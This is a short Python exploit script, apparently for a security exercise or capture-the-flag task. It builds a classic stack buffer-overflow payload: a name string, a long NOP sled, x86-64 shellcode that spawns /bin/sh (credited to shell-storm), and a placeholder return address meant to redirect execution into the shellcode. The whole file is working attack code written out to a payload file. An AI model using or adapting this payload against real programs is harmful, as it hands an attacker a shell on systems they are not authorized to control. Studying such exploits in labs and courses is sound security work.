import binascii

n = "Mark Thompson"
shcode = "31c048bbd19d9691d08c97ff48f7db53545f995257545eb03b0f05".encode()
r = 'bbbbbbbb'
start = n.encode()
buffString = ''
for i in range(600):
	buffString += '90'
buffString2 = ''
for i in range(1):
        buffString2 += '90'
by = binascii.a2b_hex(''.join(buffString))
by2 = binascii.a2b_hex(''.join(buffString2))
r = binascii.a2b_hex(''.join(r))
by = start + by # initial buffer code with name string stored at start
by += shcode    # shell code from http://shell-storm.org/shellcode/files/shellcode-806.php
by += by2       # additional buffer after shell code
by += r         # return address that should overwrite the existing return address and send code to shell code
f = open('testFile','wb')
f.write(by)
